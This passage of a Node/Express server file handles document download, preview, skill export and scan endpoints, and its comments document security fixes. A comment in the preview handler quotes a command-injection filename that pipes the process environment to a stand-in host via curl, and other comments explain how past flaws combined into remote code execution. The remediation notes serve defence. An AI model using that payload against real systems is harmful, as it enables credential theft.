  // oracle.
  const safeName = basename( String( req.params.filename || '' ) );
  if ( ! isSafeFilename( safeName ) ) {
    return res.status( 400 ).json( { error: 'Invalid filename.' } );
  }

  const auth = authoriseDocumentRequest( req, safeName );
  if ( ! auth.ok ) {
    return res.status( auth.status ).json( { error: auth.error } );
  }

  // v12.28.0 (TNX-C-005 item 5): boundary-correct containment plus symlink
  // refusal. basename() alone cannot stop a symlink inside the downloads
  // directory from pointing outside it.
  const filePath = resolveContained( DOWNLOADS_BASE, safeName );
  if ( ! filePath ) {
    return res.status( 400 ).json( { error: 'Invalid filename.' } );
  }

  if ( ! existsSync( filePath ) ) {
    return res.status( 404 ).json( { error: `File not found: ${ safeName }` } );
  }

  const ext = extname( safeName ).toLowerCase();
  const mimeMap  = {
    '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    '.pdf':  'application/pdf',
    '.csv':  'text/csv',
    '.txt':  'text/plain',
    '.html': 'text/html',
    '.json': 'application/json',
    '.md':   'text/markdown',
  };

  try {
    const fileBuffer = readFileSync( filePath );
    res.setHeader( 'Content-Type', mimeMap[ ext ] || 'application/octet-stream' );
    res.setHeader( 'Content-Disposition', `attachment; filename="${ safeName }"` );
    res.setHeader( 'Content-Length', fileBuffer.length );
    return res.send( fileBuffer );
  } catch ( err ) {
    console.error( '[download] Error reading file:', err.message );
    return res.status( 500 ).json( { error: err.message } );
  }
} );
// GET /preview/:filename
// Serves a styled HTML preview of a document.
// If filename ends with .html, serves it directly as-is.
// If filename ends with .docx, serves the matching .html file (generated alongside the docx).
// Fallback: uses preview_extract.py for legacy docx-only files.
// Auth: DOCUMENT_DOWNLOAD_TOKEN or RAILWAY_RESTORE_TOKEN (query param).
app.get( '/preview/:filename', async ( req, res ) => {
  // v12.28.0 (TNX-C-010 item 3): the previewed document is rendered under a
  // CSP sandbox with no allow-scripts, which places it in a unique opaque
  // origin and disables script execution entirely. Stored HTML on the
  // connector origin therefore cannot execute, cannot read connector storage,
  // and cannot reach the embedding parent document. nosniff prevents the
  // browser from re-typing a response and defeating the declared type.
  // no-referrer stops the query-string token leaking onward.
  const applyPreviewHeaders = () => {
    // sandbox is listed WITHOUT allow-scripts and WITHOUT allow-same-origin,
    // which is what disables script execution and severs access to the
    // connector origin. allow-popups and allow-top-navigation-by-user-activation
    // are granted so the "Download Original" link inside the preview continues
    // to work when the user clicks it; neither grant re-enables scripting.
    // script-src 'none' is stated explicitly as well, so the policy still
    // blocks scripts in any user agent that ignores the sandbox directive.
    res.setHeader(
      'Content-Security-Policy',
      "sandbox allow-popups allow-top-navigation-by-user-activation; " +
      "default-src 'none'; script-src 'none'; object-src 'none'; " +
      "style-src 'unsafe-inline' https:; img-src data: https:; font-src data: https:; " +
      "base-uri 'none'; form-action 'none';"
    );
    res.setHeader( 'X-Content-Type-Options', 'nosniff' );
    res.setHeader( 'Referrer-Policy', 'no-referrer' );
  };
  applyPreviewHeaders();

  // v12.28.0 (TNX-C-010 item 2): strict single-segment validation on top of
  // basename(). This is the control that makes the execFileSync call below
  // safe even against a filename that was created before this release.
  //
  // TNX-FEAT-SIGNEDURLS: moved ahead of authorisation for the same reason as on
  // /download -- the signature is computed over the normalised filename.
  const safeName = basename( String( req.params.filename || '' ) );
  if ( ! isSafeFilename( safeName ) ) {
    return res.status( 400 ).json( { error: 'Invalid filename.' } );
  }

  // Preview and download are the same document served two ways, so they share
  // one authorisation path and one signature. A link signed for a file is valid
  // for both routes, which is correct: neither grants access the other does not.
  const auth = authoriseDocumentRequest( req, safeName );
  if ( ! auth.ok ) {
    return res.status( auth.status ).json( { error: auth.error } );
  }

  // CONN-V2-FIX-01: the credential that authorised this request, re-serialised
  // for reuse on the "Download Original" link below.
  //
  // Before this fix the three templates below interpolated a bare identifier
  // `token` that was never declared in this handler or at module scope, so
  // every request that reached them threw ReferenceError and returned 500.
  // Even had it resolved, a `?token=` link is refused outright once
  // ALLOW_LEGACY_DOWNLOAD_TOKEN=false, and carries a global credential into a
  // page the user can save. Echoing the caller's own verified credential is
  // correct on both counts.
  //
  // Every link built from authQuery below targets safeName itself, which is
  // what keeps the signature valid: the payload is `${filename}:${exp}`, so
  // changing the filename while keeping the query is precisely the defect
  // being fixed.
  const authQuery = sameFileAuthQuery( req );

  const ext   = extname( safeName ).toLowerCase();
  const dlDir = DOWNLOADS_BASE;

  // Auto-create downloads directory if missing
  if ( !existsSync( dlDir ) ) mkdirSync( dlDir, { recursive: true } );

  // ── Serve .html files directly (generated alongside the docx) ──────────────
  if ( ext === '.html' ) {
    const filePath = resolveContained( dlDir, safeName );
    if ( ! filePath || !existsSync( filePath ) ) {
      return res.status( 404 ).json( { error: `Preview not found: ${ safeName }` } );
    }
    res.setHeader( 'Content-Type', 'text/html; charset=utf-8' );
    return res.send( readFileSync( filePath, 'utf-8' ) );
  }

  // ── For .docx: look for a matching .html first (fast path) ─────────────────
  if ( ext === '.docx' ) {
    const htmlName = safeName.replace( /\.docx$/i, '.html' );
    const htmlPath = resolveContained( dlDir, htmlName );
    if ( htmlPath && existsSync( htmlPath ) ) {
      res.setHeader( 'Content-Type', 'text/html; charset=utf-8' );
      return res.send( readFileSync( htmlPath, 'utf-8' ) );
    }

    // Fallback: run preview_extract.py for legacy .docx with no paired .html
    const docxPath = resolveContained( dlDir, safeName );
    if ( ! docxPath || !existsSync( docxPath ) ) {
      return res.status( 404 ).json( { error: `File not found: ${ safeName }` } );
    }

    let extracted;
    try {
      // v12.28.0 (TNX-C-010 item 1): execSync invoked /bin/sh -c with the
      // filename interpolated into a double-quoted shell string, so a name
      // such as  a";curl evil.test/$(cat /proc/self/environ|base64);"b.docx
      // broke out of the quoting and executed as the `mcp` user, which owns
      // the application source and the /data volume.
      //
      // execFileSync passes an argument array straight to execve. No shell is
      // involved at any point, so shell metacharacters in the filename are
      // inert data. This eliminates the vulnerability class rather than
      // filtering for it, and the strict filename validation above is a second,
      // independent layer rather than the primary control.
      const stdout = execFileSync(
        PREVIEW_PYTHON_BIN,
        [ PREVIEW_EXTRACT_SCRIPT, docxPath ],
        { timeout: 15000, encoding: 'utf-8', maxBuffer: 8 * 1024 * 1024 }
      );
      extracted = JSON.parse( stdout );
    } catch ( err ) {
      console.error( '[preview] extract error:', err.message );
      const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
      // esc() on authQuery turns the '&' between exp and sig into '&amp;', which
      // is what an HTML attribute requires. Browsers tolerate a bare '&' here,
      // but a validating parser is entitled to read '&sig' as an entity.
      return res.send( `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>${ esc(safeName) }</title></head><body style="font-family:sans-serif;max-width:600px;margin:60px auto;padding:20px;text-align:center"><h2>${ esc(safeName) }</h2><p>Preview not available.</p><a href="/download/${ encodeURIComponent(safeName) }${ esc(authQuery) }" style="display:inline-block;background:#2563eb;color:#fff;padding:12px 24px;text-decoration:none;border-radius:6px;">Download File</a></body></html>` );
    }

    const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    // Same filename, same credential. encodeURIComponent on the segment mirrors
    // the download route's own basename handling; esc() makes the query safe to
    // sit inside an href attribute.
    const downloadUrl = `/download/${ encodeURIComponent( safeName ) }${ esc( authQuery ) }`;
    let bodyHtml = '';
    for ( const sec of extracted.sections || [] ) {
      if ( sec.type === 'heading' ) {
        const tag = `h${ Math.min( ( sec.level || 0 ) + 1, 4 ) }`;
        bodyHtml += `<${ tag }>${ esc( sec.text ) }</${ tag }>\n`;
      } else if ( sec.type === 'text' ) {
        bodyHtml += `<p>${ esc( sec.text ) }</p>\n`;
      } else if ( sec.type === 'table' ) {
        bodyHtml += '<table>\n';
        if ( sec.headers && sec.headers.length ) {
          bodyHtml += '  <thead><tr>' + sec.headers.map( h => `<th>${ esc( typeof h === 'object' ? (h.text||'') : h ) }</th>` ).join('') + '</tr></thead>\n';
        }
        if ( sec.rows && sec.rows.length ) {
          bodyHtml += '  <tbody>\n';
          for ( const row of sec.rows ) {
            bodyHtml += '    <tr>' + row.map( c => `<td>${ esc( typeof c === 'object' ? (c.text||'') : c ) }</td>` ).join('') + '</tr>\n';
          }
          bodyHtml += '  </tbody>\n';
        }
        bodyHtml += '</table>\n';
      }
    }

    return res.send( `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>${ esc( extracted.title || safeName ) }</title><style>body{font-family:Calibri,Georgia,serif;background:#e8e8e4;padding:24px 16px}div.doc-body{background:#fff;max-width:820px;margin:0 auto;padding:40px 48px;box-shadow:0 2px 12px rgba(0,0,0,.12)}h2{font-size:14pt;margin:18pt 0 6pt;color:#222}p{font-size:11pt;line-height:1.55;margin-bottom:8pt;color:#1a1a1a}table{border-collapse:collapse;width:100%;margin:14pt 0;font-size:10.5pt}th{background:#f0f0f0;padding:6pt 8pt;border:1px solid #c8c8c8;text-align:left}td{padding:5pt 8pt;border:1px solid #c8c8c8}tr:nth-child(even) td{background:#f7f7f7}</style></head><body><div class="doc-body">${ bodyHtml }<p style="margin-top:24px"><a href="${ downloadUrl }" target="_parent" style="display:inline-block;background:#4A9080;color:#fff;padding:10px 20px;text-decoration:none;border-radius:5px;">Download Original (.docx)</a></p></div></body></html>` );
  }

  // ── Non-docx: serve a simple download page ──────────────────────────────────
  const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  return res.send( `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>${ esc(safeName) }</title><style>body{font-family:sans-serif;max-width:600px;margin:60px auto;padding:20px;text-align:center}a{display:inline-block;color:#fff;padding:12px 24px;background:#2563eb;text-decoration:none;border-radius:6px}</style></head><body><h2>${ esc(safeName) }</h2><p>This file type cannot be previewed.</p><a href="/download/${ encodeURIComponent(safeName) }${ esc(authQuery) }" target="_parent">Download File</a></body></html>` );
} );

// ---------------------------------------------------------------------------
// REMOVED in v12.28.0 -- POST /data/upload-binary  (TNX-C-003)
//
// This endpoint accepted a filename and base64 payload with no authentication,
// no extension policy and no size limit beyond the 50mb global body cap. It
// wrote directly to the persistent volume, entirely bypassing the sibling
// POST /data/upload handler, which applies UPLOAD_ALLOWED_EXTS /
// UPLOAD_DENIED_EXTS and sanitises the filename with [^a-zA-Z0-9._-] -> '_'.
//
// Three compounding effects made this Critical:
//   1. Unauthenticated write of any file type to the persistent volume,
//      including the .py, .sh and .exe extensions the sibling denylist exists
//      specifically to refuse.
//   2. No quota, so repeated posts exhausted the volume shared with the memory
//      store, the schedule store and the download directory.
//   3. basename() strips directory separators but preserves quotes, semicolons,
//      backticks, $ and spaces, so it was the primitive that created a file
//      whose NAME contained shell metacharacters. GET /preview/:filename then
//      interpolated that name into an execSync shell string (TNX-C-010). The
//      two findings composed into unauthenticated remote code execution.
//
// The endpoint is deleted rather than patched. POST /data/upload already
// provides the function correctly. Callers that were posting binary content
// here must switch to POST /data/upload with { filename, content_base64 }.
//
// The 410 handler below is deliberate: a 404 would look like a routing fault
// and invite retries, whereas 410 Gone states that the resource was removed on
// purpose and gives the caller the replacement.
// ---------------------------------------------------------------------------
app.post('/data/upload-binary', (_req, res) => {
  log('warn', 'upload-binary: call to removed endpoint refused (TNX-C-003)');
  return res.status(410).json({
    error:       'This endpoint was removed in v12.28.0 for security reasons (TNX-C-003).',
    code:        'ENDPOINT_REMOVED',
    replacement: 'POST /data/upload with { filename, content_base64, mime_type }',
  });
});
// GET /tools — tool manifest for Tenax gateway discovery (v2.4.4+)
// ---------------------------------------------------------------------------
// REMOVED in v12.35.0 -- a second GET /tools registration (TNX-M-002)
//
// `GET /tools` was registered TWICE. Express dispatches to the first match, so
// this second async handler was unreachable dead code from the moment it was
// added.
//
// I compared them before deleting rather than assuming the later one was the
// intended replacement, because the audit notes "the two implementations
// differ, so it is unclear which was intended". The live handler is a strict
// superset:
//
//                              live (kept)   second (removed)
//   X-Railway-Restore-Token    yes           NO AUTH AT ALL
//   modular tool swapping      yes           yes
//   tenant write-tool filter   yes           yes
//   MCP -> Anthropic schema    yes           no
//
// So the dead one added nothing and would have removed authentication had the
// registration order ever been reversed -- which a routine reordering of this
// 3,500-line file could have done silently.
//
// A boot assertion now fails the process if any method/path pair is registered
// twice, so this cannot recur unnoticed.
// ---------------------------------------------------------------------------

// -----------------------------------------------------------------------
// 404
// -----------------------------------------------------------------------
// ---------------------------------------------------------------------------
// Modular mode read/write endpoints (v11.3.0)
// GET  /modular-mode         - returns effective mode, source, and env var value (no auth)
// POST /set-modular-mode     - writes .modular_mode file (requires X-Railway-Restore-Token)
//
// The mode file is checked by isModularEnabled() on every ListTools request,
// so toggling takes effect at the start of the next Claude session without
// a Railway redeploy. The file overrides SKILL_MODULAR_ENABLED env var when present.
// ---------------------------------------------------------------------------
app.get("/modular-mode", (_req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "Skill volume not configured (SKILL_FILE_PATH not set)." });
  }
  res.json(getModularModeStatus());
});

app.post("/set-modular-mode", (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "Skill volume not configured (SKILL_FILE_PATH not set)." });
  }
  const token = req.headers["x-railway-restore-token"] || "";
  if (!RAILWAY_RESTORE_TOKEN || !constantTimeEquals(token, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token." });
  }
  const body    = req.body || {};
  const enabled = body.enabled;
  if (typeof enabled !== "boolean") {
    return res.status(400).json({ error: "enabled (boolean) is required in request body." });
  }
  const modePath = getModeFilePath();
  try {
    const dir = modePath.replace(/[/\\][^/\\]+$/, "");
    if (dir && !existsSync(dir)) mkdirSync(dir, { recursive: true });
    writeFileSync(modePath, String(enabled), "utf8");
    log("info", `set-modular-mode: mode file written -> ${enabled}`);
    const status = getModularModeStatus();
    return res.json({
      success:  true,
      enabled,
      previous: !enabled,
      status,
      note: "Mode file written. Takes effect at the start of the next Claude session (new MCP connection). No Railway redeploy needed.",
    });
  } catch (err) {
    log("error", `set-modular-mode: failed to write mode file: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------------
// GET /brain-data  (v12.10.0)
// Serve the architecture scan written by brain_scan.py.
//
// The Neural Core visualiser in the Tenax gateway reads this through a
// server-side proxy, so the token never reaches a browser.
//
// Auth:     X-Railway-Restore-Token (header or ?token=)
// Query:    ?rescan=1  run brain_scan.py first and wait for it
// Response: the raw ava_brain_data.json payload
//
// The gateway also has a fallback path via GET /download/ava_brain_data.json,
// which brain_scan.py mirrors into /data/downloads. This endpoint is the
// preferred one: it reads the canonical file, sets a real content type, and
// can trigger a scan when the volume has never been scanned.
// ---------------------------------------------------------------------------

app.get("/brain-data", async (req, res) => {
  const token = (req.query.token || req.headers["x-railway-restore-token"] || "").toString().trim();
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set. Cannot authenticate brain-data requests." });
  }
  if (!constantTimeEquals(token, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token." });
  }

  const paths = getBrainScanPaths();
  const wantsRescan = ["1", "true", "yes"].includes(String(req.query.rescan || "").toLowerCase());

  try {
    // v12.36.0: a plain read NEVER starts a scanner.
    //
    // This block used to also fire when the data file was simply absent, so an
    // ordinary page load of the Neural Core could spawn Python. That is not a
    // manual trigger: the visitor did not ask for a scan, they asked for a
    // picture. Under the manual-only policy the only thing that starts the
    // scanner here is an explicit ?rescan=1, which is what the gateway's
    // Refresh button sends.
    if (wantsRescan) {
      if (!paths.scannerPresent) {
        return res.status(404).json({
          error: "brain_scan.py is not deployed to " + paths.scriptsDir + ".",
          hint: "Upload brain_scan.py and brain_tools_catalog.json to the scripts directory, then retry.",
        });
      }
      log("info", "[/brain-data] running scanner (rescan explicitly requested)");
      const ok = await runBrainScan({ force: true, trigger: "GET /brain-data?rescan=1" });
      if (!ok && !existsSync(paths.dataPath)) {
        return res.status(503).json({
          error: "brain_scan.py did not produce " + paths.dataPath + ".",
          hint: "Run script_execute on brain_scan.py to see its stderr.",
        });
      }
    }

    if (!existsSync(paths.dataPath)) {
      // Honest empty state rather than a silent background scan. The gateway
      // surfaces this message to the operator, and one Refresh fixes it.
      return res.status(404).json({
        error: "No architecture scan on this volume yet.",
        path: paths.dataPath,
        trigger_policy: paths.triggerPolicy,
        hint: paths.scannerPresent
          ? "Scans are manual only as of connector v12.36.0. Retry with ?rescan=1, press Refresh in the Neural Core, or POST /brain-scan."
          : "brain_scan.py is not on the volume. Upload it to " + paths.scriptsDir + ", then request a scan with ?rescan=1.",
      });
    }

    const body = readFileSync(paths.dataPath, "utf8");
    res.setHeader("Content-Type", "application/json; charset=utf-8");
    res.setHeader("Cache-Control", "private, max-age=3600");
    return res.status(200).send(body);
  } catch (err) {
    log("error", `[/brain-data] ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// ---------------------------------------------------------------------------
// GET /brain-data/status  (v12.10.0)
// Diagnostics: is the scanner deployed, has it ever run, is one running now.
// ---------------------------------------------------------------------------


// ---------------------------------------------------------------------------
// POST /brain-scan — trigger a Neural Core scan on demand (v12.23.0)
//
// v12.36.0: this is now the PRIMARY manual trigger. It was previously called on
// a 15-minute WordPress cron; that schedule has been removed from the plugin,
// and this endpoint is instead driven by the "Run scan now" button on the
// Neural Core Scan admin screen, or by an operator with curl.
//
// Three defects were fixed here at the same time, because promoting an endpoint
// to "the way scans happen" means it has to hold up on its own:
//
//   1. AUTH BYPASS. The guard was `if (allowedToken && token !== allowedToken)`.
//      With neither DOCUMENT_DOWNLOAD_TOKEN nor RAILWAY_RESTORE_TOKEN set,
//      allowedToken was '' and the condition short-circuited to false, so ANY
//      unauthenticated caller could spawn Python on the volume, repeatedly. It
//      now fails closed with 503 when no token is configured.
//   2. TIMING. `token !== allowedToken` is a short-circuiting comparison and
//      leaks position-of-first-difference. Every other privileged route here
//      uses constantTimeEquals; this one now does too.
//   3. TYPE CRASH. `req.query.token` is an ARRAY when a caller sends
//      ?token=a&token=b, and .trim() on an array throws, turning a malformed
//      request into a 500. Coerced with String() first, matching /brain-data.
// ---------------------------------------------------------------------------
app.post('/brain-scan', async (req, res) => {
  const token = String(req.query.token || req.headers['x-scan-token'] || '').trim();
  const allowedToken = process.env.DOCUMENT_DOWNLOAD_TOKEN || process.env.RAILWAY_RESTORE_TOKEN || '';

  if (!allowedToken) {
    return res.status(503).json({
      ok: false,
      error: 'Neither DOCUMENT_DOWNLOAD_TOKEN nor RAILWAY_RESTORE_TOKEN is set, so this endpoint cannot authenticate callers and is disabled.',
    });
  }
  if (!constantTimeEquals(token, allowedToken)) {
    return res.status(403).json({ ok: false, error: 'Invalid or missing scan token.' });
  }

  const paths = getBrainScanPaths();
  if (!paths.enabled) {
    return res.status(503).json({
      ok: false,
      error: 'Scanning is disabled by BRAIN_SCAN_ENABLED=false.',
    });
  }
  if (!paths.scannerPresent) {
    return res.status(404).json({
      ok: false,
      error: 'brain_scan.py is not deployed to ' + paths.scriptsDir + '.',
      hint: 'Upload brain_scan.py to the scripts directory, then retry.',
    });
  }

  try {
    const startedAt = Date.now();
    const ok = await runBrainScan({ force: true, trigger: 'POST /brain-scan' });
    res.json({
      ok,
      timestamp: new Date().toISOString(),
      duration_ms: Date.now() - startedAt,
      trigger_policy: paths.triggerPolicy,
      note: ok
        ? 'Brain scan completed successfully.'
        : 'Brain scan did not complete. Check connector logs for details.',
    });
  } catch (err) {
    log('error', `[/brain-scan] ${err.message}`);
    res.status(500).json({ ok: false, error: err.message });
  }
});


app.get("/brain-data/status", (req, res) => {
  const token = (req.query.token || req.headers["x-railway-restore-token"] || "").toString().trim();
  if (!RAILWAY_RESTORE_TOKEN || !constantTimeEquals(token, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token." });
  }
  const paths = getBrainScanPaths();
  let scanTimestamp = null;
  let nodeCount = 0;
  try {
    if (existsSync(paths.dataPath)) {
      const parsed = JSON.parse(readFileSync(paths.dataPath, "utf8"));
      scanTimestamp = parsed.timestamp || null;
      nodeCount = Array.isArray(parsed.nodes) ? parsed.nodes.length : 0;
    }
  } catch (err) {
    log("warn", `[/brain-data/status] cannot read scan: ${err.message}`);
  }
  // v12.36.0: describeScanState() reports the on-disk state without acting on
  // it. Under the old boot scan, "no scan present" was a transient condition
  // the connector fixed for you; it is now a standing fact an operator needs to
  // see, so status reports it explicitly alongside the trigger policy.
  const scanState = describeScanState();

  return res.json({
    ...paths,
    dataPresent: scanState.present && !scanState.empty,
    dataFileSize: scanState.size,
    dataFileEmpty: scanState.empty,
    dataFileError: scanState.error,
    lastCompilePresent: existsSync(paths.lastCompilePath),
    scanTimestamp,
    nodeCount,
    scanRequiredAction: (scanState.present && !scanState.empty)
      ? null
      : 'No usable scan on this volume. Scans are manual only: POST /brain-scan, GET /brain-data?rescan=1, or press Refresh in the Neural Core.',
  });
});

// ---------------------------------------------------------------------------
// GET /skill-export  (v12.2.2)
// Export all non-personal skill files from this connector's Railway volume.
// Paths returned are relative to the ava content directory — NO leading 'ava/'
// prefix — so they are directly usable by the gateway's /restore-modules endpoint.
//
// avaDir resolution (handles both common SKILL_FILE_PATH layouts):
//   /data/skill/SKILL.md     → SKILL_BASE_DIR=/data/skill     → avaDir=/data/skill/ava
//   /data/skill/ava/SKILL.md → SKILL_BASE_DIR=/data/skill/ava → avaDir=/data/skill/ava
//
// Auth: X-Railway-Restore-Token
// Response: { files: { "relative/path": "content" }, file_count: N, ava_dir: string }

app.get("/skill-export", (req, res) => {
  if (!SKILL_ENABLED || !SKILL_BASE_DIR) {
    return res.status(503).json({ error: "SKILL_FILE_PATH not set. Skill volume not configured." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set. Configure it in Railway Variables." });
  }

  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
  }

  // Determine the ava content directory regardless of SKILL_FILE_PATH layout
  const avaDir = SKILL_BASE_DIR.endsWith("/ava")
    ? SKILL_BASE_DIR
    : (SKILL_BASE_DIR + "/ava");

  if (!existsSync(avaDir)) {
    return res.status(503).json({
      error: `ava content directory not found at ${avaDir}. Push skill files to this connector first.`,
      ava_dir: avaDir,
    });
  }

  const PERSONAL_FILES = new Set(["PERSONALITY.md", "PROFILES.md"]);
  const files = {};

  function walkDir(absDir) {
    if (!existsSync(absDir)) return;
    let entries;
    try {
      entries = readdirSync(absDir, { withFileTypes: true });
    } catch (e) {
      log("warn", `skill-export: cannot read dir ${absDir}: ${e.message}`);
      return;
    }
    for (const entry of entries) {
      const absPath = `${absDir}/${entry.name}`;
      if (entry.isDirectory()) {
        walkDir(absPath);
      } else if (entry.isFile()) {
        // Relative to avaDir — no leading 'ava/' prefix
        const relPath = absPath.slice(avaDir.length).replace(/^\//, "");
        if (PERSONAL_FILES.has(entry.name)) continue;
        if (entry.name.startsWith("."))      continue;
        if (!/\.(md|json|py|sh|js|ts|txt)$/i.test(entry.name)) continue;
        try {
          files[relPath] = readFileSync(absPath, "utf8");
        } catch (e) {
          log("warn", `skill-export: cannot read file ${absPath}: ${e.message}`);
        }
      }
    }
  }

  try {
    walkDir(avaDir);
    const fileCount = Object.keys(files).length;
    log("info", `skill-export: exported ${fileCount} files from ${avaDir}`);
    return res.json({ files, file_count: fileCount, ava_dir: avaDir });
  } catch (err) {
    log("error", `skill-export exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});


// POST /ti-skill-compile  (v12.7.0)
// ---------------------------------------------------------------------------
// Gateway-to-connector skill compilation endpoint for the Tenax Intelligence
// platform. Exposes handleSkillCompile() as a direct REST call so the TI
// gateway can fetch the compiled skill without needing an MCP client.
//
// Auth:    X-Railway-Restore-Token (same token as /skill-export and /restore-skill).
// Gating: Requires SKILL_ENABLED=true AND SKILL_MODULAR_ENABLED=true.
//         Returns 503 if either is not configured.
//
// Request body:
//   { query, context_hint, person_name, session_id }
//
// Response 200:
//   {
//     skill:            string,   // Full compiled skill text (CORE + modules + personality)
//     specialist_count: number,   // Specialist modules loaded
//     line_count:       number,   // Total compiled lines
//     modules_loaded:   string[], // Module names in load order
//     session_id:       string,
//     conditions:       string[], // Conditions detected from query
//     person_prior_active: bool,
//     note:             string,   // Human-readable compile summary
//   }
//
// Response 503: Not configured (modular mode off or token missing)
// Response 403: Invalid token
// Response 500: Compile error (check MANIFEST.json and CORE.md)
// ---------------------------------------------------------------------------

app.post("/ti-skill-compile", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({
      error: "Skill system not configured.",
      hint:  "Set SKILL_FILE_PATH in Railway Variables.",
    });
  }

  // SKILL_MODULAR_ENABLED is NOT checked here. handleSkillCompile() manages
  // its own path detection and returns a graceful error if modular files are
  // missing. The MCP skill_compile tool works the same way -- it never gates
  // on this flag. Removing this guard makes the HTTP endpoint consistent.

  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({
      error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables.",
      hint:  "Set RAILWAY_RESTORE_TOKEN to enable this endpoint.",
    });
  }

  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
  }

  const {
    query               = "",
    context_hint        = "",
    person_name         = "",
    session_id          = new Date().toISOString().slice(0, 10).replace(/-/g, ""),
    module_access_level = "full",
  } = req.body || {};

  try {
    const result = await handleSkillCompile({ query, context_hint, person_name, session_id, module_access_level });

    if (result.isError) {
      let parsed = {};
      try { parsed = JSON.parse(result.content?.[0]?.text || "{}"); } catch { /* ignore */ }
      log("error", `[ti-skill-compile] compile error: ${parsed.error || "unknown"}`);
      return res.status(500).json({ error: parsed.error || "skill_compile failed.", hint: parsed.hint });
    }

    let parsed = {};
    try { parsed = JSON.parse(result.content[0].text); } catch { /* ignore */ }

    log("info", `[ti-skill-compile] compiled for session ${session_id}: ${parsed.specialist_count} specialists, ${parsed.line_count} lines`);

    return res.json({
      skill:               parsed.content        || "",
      specialist_count:    parsed.specialist_count || 0,
      line_count:          parsed.line_count       || 0,
      modules_loaded:      parsed.modules_loaded   || [],
      session_id:          parsed.session_id       || session_id,
      conditions:          parsed.conditions_detected || [],
      person_prior_active: parsed.person_prior_active || false,
      note:                parsed.note             || "",
    });

  } catch (err) {
    log("error", `[ti-skill-compile] exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /ti-skill-check-scope  (v12.9.0)
// Mid-session skill scope check. Called by the Tenax gateway at turns 2, 5, and 10
// to detect whether the conversation has entered territory requiring specialist
// modules not loaded at initial compile time. Returns delta module content only.
// Auth: X-Railway-Restore-Token (same as /ti-skill-compile).
app.post("/ti-skill-check-scope", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "Skill system not configured.", hint: "Set SKILL_FILE_PATH in Railway Variables." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set.", hint: "Set RAILWAY_RESTORE_TOKEN to enable this endpoint." });
  }
  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
  }

  const { conversation_text, loaded_modules = [], session_id } = req.body || {};
  if (!conversation_text || typeof conversation_text !== "string") {
    return res.status(400).json({ error: "conversation_text is required." });
  }

  try {
    const manifestPath = SKILL_BASE_DIR ? pathJoin(SKILL_BASE_DIR, "MANIFEST.json") : null;
    if (!manifestPath || !existsSync(manifestPath)) {
      return res.json({ new_modules: [], modules_loaded: loaded_modules, delta_content: null, checked_at: new Date().toISOString() });
    }

    let manifest;
    try { manifest = JSON.parse(readFileSync(manifestPath, "utf8")); } catch {
      return res.json({ new_modules: [], modules_loaded: loaded_modules, delta_content: null, checked_at: new Date().toISOString() });
    }

    const modules   = manifest.modules || {};
    const loadedSet = new Set(loaded_modules);
    const ALWAYS_LOADED = new Set(["meta-trigger-recognition", "meta-dispatcher-routing", "meta-self-check", "meta-llm-environment", "meta-deepseek-counterpull", "meta-perplexity-counterpull"]);
    const SCORE_THRESHOLD   = 0.3;
    const MAX_NEW_PER_CHECK = 3;
    const lower = conversation_text.toLowerCase();

    const candidates = [];
    for (const [moduleId, entry] of Object.entries(modules)) {
      if (loadedSet.has(moduleId) || ALWAYS_LOADED.has(moduleId)) continue;
      const triggers = entry.dispatch_triggers || entry.triggers || [];
      if (!triggers.length) continue;
      let matchCount = 0;
      for (const t of triggers) {
        const tl = String(t).toLowerCase().trim();
        if (!tl) continue;
        if (lower.includes(tl)) { matchCount += 1.0; continue; }
        const words = tl.split(/\s+/).filter(w => w.length > 3);
        if (words.length) {
          const matched = words.filter(w => lower.includes(w)).length;
          if (matched > 0) matchCount += (matched / words.length) * 0.7;
        }
      }
      const score = Math.min(matchCount / Math.max(triggers.length, 1), 1.0);
      if (score >= SCORE_THRESHOLD) candidates.push({ moduleId, score, entry });
    }
    candidates.sort((a, b) => b.score - a.score);
    const selected = candidates.slice(0, MAX_NEW_PER_CHECK);

    const newModules    = [];
    const triggerMatches = {};
    const chunks        = [];
